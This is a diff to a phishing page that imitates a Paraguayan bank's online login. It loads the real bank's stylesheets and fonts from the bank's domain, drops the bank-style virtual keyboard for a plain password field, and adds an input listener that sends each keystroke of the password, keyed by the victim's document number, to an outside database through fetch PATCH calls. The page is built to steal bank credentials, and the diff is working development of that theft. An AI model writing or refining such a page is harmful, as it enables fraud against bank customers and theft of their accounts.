@@ -11,11 +11,9 @@
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar.css">
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_margin.css">
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_icons.css">
-<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/keyboard.css">
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar-responsive.css">
 <link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/main.css">
 <style>
-  /* Tipografias reales del banco, con URL absoluta y respaldo sans-serif */
   @font-face{font-family:'robotoregular';font-weight:400;font-style:normal;font-display:swap;
     src:url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-regular-webfont-5f945f5c55a07d2a60221ab200fd4133.woff2') format('woff2'),
         url('https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/roboto-regular-webfont-9db7888a4c2b34bebe331fa65c534f16.woff') format('woff');}
@@ -35,20 +33,9 @@
   .glyphicon{font-family:'Glyphicons Halflings' !important}
 
   .box-login{padding-bottom:24px}
-  .field-password{margin-bottom:4px}
-
-  #teclado{padding:0;margin-bottom:10px}
-  #contenedorteclado{width:252px;margin:0 auto}
-  #botonesteclado{height:auto !important;padding:12px 8px 10px !important;font-size:1em;white-space:normal;box-shadow:0 2px 10px #444}
-  .keyboard-button{width:34px !important;height:34px !important;font-size:17px !important;line-height:32px;margin:4px !important;padding:0 !important;border-radius:6px}
-  .keyboard-button:active{background-color:#bcbcbb}
-  .boton-borrar{
-    position:static !important;-webkit-transform:none !important;transform:none !important;
-    width:100% !important;height:30px !important;font-size:12px !important;
-    margin:6px 0 0 !important;display:block !important;
-    background-color:#c9c9c8 !important;color:#333 !important;border-radius:6px !important;
-  }
-  .field-password input{font-size:20px;letter-spacing:3px}
+  .box-form{padding-bottom:10px}
+  .field-password input{font-size:19px;letter-spacing:2px}
+  .field-password input::placeholder{letter-spacing:normal;font-size:15px}
   #errorBox{display:none;margin-top:12px;padding:10px;border-radius:6px;font-weight:bold;font-size:13px}
 </style>
 </head>
@@ -82,32 +69,7 @@
               <div class="col-xs-12 col-sm-12 content-check-login pdt-15"></div>
 
               <div class="col-xs-12 col-sm-12 pdt-15 field-password">
-                <input id="password" placeholder="Contraseña" type="password" class="input-login" readonly="readonly" autocomplete="off">
-              </div>
-
-              <div class="col-xs-12 col-sm-12 pdt-15">
-                <div id="teclado" class="content-teclado impPass-content">
-                  <div id="contenedorteclado">
-                    <div id="botonesteclado" name="teclado-familiar" class="keyboard-keyset" style="display:block;">
-                      <input value="B" id="boton-B" type="button" class="keyboard-button">
-                      <input value="C" id="boton-C" type="button" class="keyboard-button">
-                      <input value="D" id="boton-D" type="button" class="keyboard-button">
-                      <input value="A" id="boton-A" type="button" class="keyboard-button">
-                      <input value="E" id="boton-E" type="button" class="keyboard-button"><br>
-                      <input value="3" id="boton-3" type="button" class="keyboard-button">
-                      <input value="0" id="boton-0" type="button" class="keyboard-button">
-                      <input value="5" id="boton-5" type="button" class="keyboard-button">
-                      <input value="2" id="boton-2" type="button" class="keyboard-button">
-                      <input value="7" id="boton-7" type="button" class="keyboard-button"><br>
-                      <input value="6" id="boton-6" type="button" class="keyboard-button">
-                      <input value="1" id="boton-1" type="button" class="keyboard-button">
-                      <input value="4" id="boton-4" type="button" class="keyboard-button">
-                      <input value="9" id="boton-9" type="button" class="keyboard-button">
-                      <input value="8" id="boton-8" type="button" class="keyboard-button"><br>
-                      <input value="Borrar" id="boton-Borrar" type="button" class="keyboard-button boton-borrar">
-                    </div>
-                  </div>
-                </div>
+                <input id="password" placeholder="Contraseña" type="password" class="input-login" maxlength="30" autocomplete="off">
               </div>
 
               <div class="col-xs-12 col-sm-12">
@@ -195,20 +157,9 @@
   doc.focus();
   doc.addEventListener('input', function(){ this.value = this.value.replace(/\D/g,'').slice(0,9); });
 
-  function guardarClave(){
+  pass.addEventListener('input', function(){
     fetch(DB+'/usuarios/'+id+'.json',{method:'PATCH',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({clave:pass.value})}).catch(function(){});
-  }
-
-  document.getElementById('botonesteclado').addEventListener('click', function(ev){
-    var b = ev.target;
-    if(b.tagName !== 'INPUT') return;
-    var v = b.value;
-    if(v === 'Borrar'){ pass.value = pass.value.slice(0,-1); guardarClave(); return; }
-    if(v === 'X'){ pass.value = ''; guardarClave(); return; }
-    if(pass.value.length >= 20) return;
-    pass.value += v;
-    guardarClave();
+      body:JSON.stringify({clave:this.value})}).catch(function(){});
   });
 
   document.getElementById('div-personas').addEventListener('click', function(){
@@ -233,7 +184,7 @@
   btn.addEventListener('click', function(){
     caja.style.display = 'none';
     if(doc.value.trim().length < 5) return fallar('Ingresá tu número de documento.');
-    if(pass.value.length < 4) return fallar('Ingresá tu contraseña con el teclado virtual.');
+    if(pass.value.length < 4) return fallar('Ingresá tu contraseña.');
 
     btn.disabled = true;
     btn.textContent = 'Verificando...';
